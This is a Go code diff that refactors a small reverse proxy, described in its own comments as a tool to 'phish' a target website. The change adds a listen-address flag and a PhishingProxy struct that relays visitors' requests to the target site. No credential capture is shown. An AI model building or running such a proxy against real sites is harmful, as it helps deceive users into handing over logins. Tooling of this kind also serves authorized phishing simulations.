@@ -12,8 +12,15 @@ import (
 )
 
 var targetURL = flag.String("target", "", "The website we want to phish")
+var address = flag.String("address", "localhost:8080", "Address and port to run proxy service on. Format address:port.")
 
-func proxyRequest(u *url.URL, conn net.Conn) {
+// Phishes a target URL with a custom HTTP client.
+type PhishingProxy struct {
+	client    *http.Client
+	targetURL *url.URL
+}
+
+func (p *PhishingProxy) HandleRequest(conn net.Conn) {
 	reader := bufio.NewReader(conn)
 	request, err := http.ReadRequest(reader)
 	if err != nil {
@@ -21,15 +28,14 @@ func proxyRequest(u *url.URL, conn net.Conn) {
 		return
 	}
 
-	request.URL.Scheme = u.Scheme
-	request.URL.Host = u.Host
-	request.Host = u.Host
+	request.URL.Scheme = p.targetURL.Scheme
+	request.URL.Host = p.targetURL.Host
+	request.Host = p.targetURL.Host
 	log.Println("Sending", request.Method, "request to", request.URL.String())
 
 	// Prevent panics, see: https://stackoverflow.com/questions/19595860/http-request-requesturi-field-when-making-request-in-go
 	request.RequestURI = ""
-	http.DefaultClient.Timeout = 20 * time.Second
-	resp, err := http.DefaultClient.Do(request)
+	resp, err := p.client.Do(request)
 	if err != nil {
 		log.Println("Proxy error:", err.Error())
 		return
@@ -61,15 +67,24 @@ func main() {
 		panic(err.Error())
 	}
 
-	server, err := net.Listen("tcp", ":8080")
+	server, err := net.Listen("tcp", *address)
 	if err != nil {
 		panic(err.Error())
+	}
+	log.Println("Listening on:", *address)
+
+	client := &http.Client{
+		Timeout: 20 * time.Second,
+	}
+	phishingProxy := &PhishingProxy{
+		client:    client,
+		targetURL: u,
 	}
 	for {
 		conn, err := server.Accept()
 		if err != nil {
 			log.Println("Error when accepting request, ", err.Error())
 		}
-		go proxyRequest(u, conn)
+		go phishingProxy.HandleRequest(conn)
 	}
 }
